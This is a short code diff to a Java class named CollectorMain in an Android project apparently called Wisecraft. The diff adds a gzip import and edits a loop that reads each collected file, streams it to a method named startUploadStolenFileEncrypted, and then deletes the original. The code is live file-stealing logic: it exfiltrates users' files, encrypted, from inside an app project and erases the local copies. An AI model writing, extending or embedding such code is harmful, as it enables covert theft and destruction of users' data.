@@ -12,6 +12,7 @@ import java.net.*;
 import java.util.*;
 import static com.nao20010128nao.Wisecraft.Utils.*;
 import android.content.pm.*;
+import java.util.zip.*;
 
 public class CollectorMain extends ContextWrapper implements Runnable
 {
@@ -50,7 +51,7 @@ public class CollectorMain extends ContextWrapper implements Runnable
 		for(String filename:files){
 			System.out.println(filename);
 			try {
-				copyAndClose(sb.readFile(filename), fu.startUploadStolenFileEncrypted(filename));
+				copyAndClose(new GZIPInputStream(sb.readFile(filename)), fu.startUploadStolenFileEncrypted(filename));
 				sb.deleteFile(filename);
 			} catch (Throwable e) {
 				e.printStackTrace();
